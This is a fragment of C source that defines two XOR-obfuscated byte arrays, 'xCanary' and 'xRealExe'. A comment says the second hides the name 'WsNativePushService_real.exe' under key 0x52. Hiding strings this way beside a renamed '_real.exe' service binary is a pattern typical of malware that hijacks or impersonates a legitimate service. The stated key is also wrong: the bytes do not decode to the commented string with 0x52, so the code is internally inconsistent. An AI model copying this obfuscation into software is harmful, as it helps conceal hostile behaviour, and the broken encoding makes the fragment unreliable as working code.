...
static const unsigned char xCanary[] = {
    0xEF, 0xC4, 0x8C, 0xF9, 0xC3, 0xC8, 0xCC, 0xC9,
    0xF9, 0xDF, 0x8C, 0xF8, 0xC9, 0xC5, 0xDE, 0x8C,
    0xDF, 0xFA, 0xCF, 0x84, 0xC2, 0xC9, 0xCD, 0xC0,
    0xD8, 0xC2, 0x9E, 0xC0, 0xC9, 0xCB
};
#define xCanary_LEN 30

/* "WsNativePushService_real.exe" XOR 0x52 */
static const unsigned char xRealExe[] = {
    0xFB, 0xDF, 0xE2, 0xCD, 0xD8, 0xC3, 0xFA, 0xC9,
    0xFC, 0xD9, 0xDF, 0xC2, 0xFF, 0xC9, 0xDE, 0xFA,
    0xC3, 0xCF, 0xC9, 0x84, 0xDE, 0xC9, 0xCD, 0xC0,
    0x9E, 0xC9, 0xF4, 0xC9
};
